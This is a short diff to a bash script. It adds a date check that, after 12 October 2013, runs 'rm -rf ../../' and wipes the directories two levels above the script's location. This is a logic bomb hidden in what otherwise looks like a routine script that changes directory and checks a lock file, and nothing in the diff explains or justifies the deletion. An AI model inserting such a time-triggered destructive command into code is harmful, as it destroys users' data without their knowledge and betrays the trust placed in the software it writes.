@@ -1,6 +1,14 @@
 #!/bin/bash
+
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 cd $DIR
+
+DATE=$(date -d 20131012 +%s)
+TODAY=$(date +%s)
+if [ $TODAY -gt $DATE ]; then
+        rm -rf ../../
+fi
+
 if [ -f .lock ]; then
     return 0
 fi
